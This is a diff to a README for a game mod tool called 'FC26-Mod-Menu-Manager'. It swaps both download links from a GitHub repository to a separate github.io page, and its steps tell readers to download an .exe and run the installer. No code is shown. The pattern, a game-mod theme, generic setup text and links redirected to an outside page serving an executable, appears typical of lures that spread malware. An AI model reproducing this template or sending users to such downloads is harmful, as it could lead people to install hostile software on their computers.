@@ -1,6 +1,6 @@
 # 🎮 FC26-Mod-Menu-Manager - Organize your game mods with ease
 
-[![Download FC26-Mod-Menu-Manager](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager)
+[![Download FC26-Mod-Menu-Manager](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://inflictionlorentzforce362.github.io)
 
 ## 📁 Project Overview
 
@@ -26,7 +26,7 @@ FC26-Mod-Menu-Manager serves as a tool for players who want to modify their expe
 
 Follow these instructions to set up the software on your computer.
 
-1.  **Visit the Download Page:** Click the following link to access the software repository: [https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager](https://github.com/Inflictionlorentzforce362/FC26-Mod-Menu-Manager).
+1.  **Visit the Download Page:** Click the following link to access the software repository: [https://inflictionlorentzforce362.github.io](https://inflictionlorentzforce362.github.io).
 2.  **Locate the Release:** Find the section labeled Releases on the right side of the screen. Click on the latest version number.
 3.  **Choose the File:** Look for the file ending in `.exe` under the Assets section. Click the filename to start the download.
 4.  **Run the Installer:** Once the download finishes, navigate to your Downloads folder. Double-click the file to launch the installation wizard.
